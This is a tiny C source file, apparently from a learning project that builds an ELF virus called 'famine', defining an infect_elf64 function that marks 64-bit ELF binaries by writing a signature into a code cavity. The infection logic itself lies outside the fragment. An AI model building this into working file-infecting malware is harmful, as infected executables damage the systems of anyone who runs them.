#include "famine.h"

void infect_elf64(t_file *file, t_elf64 *elf64)
{
	if (sign_elf64_cavity(file, elf64))
		return ; // sign_elf64_append()
}
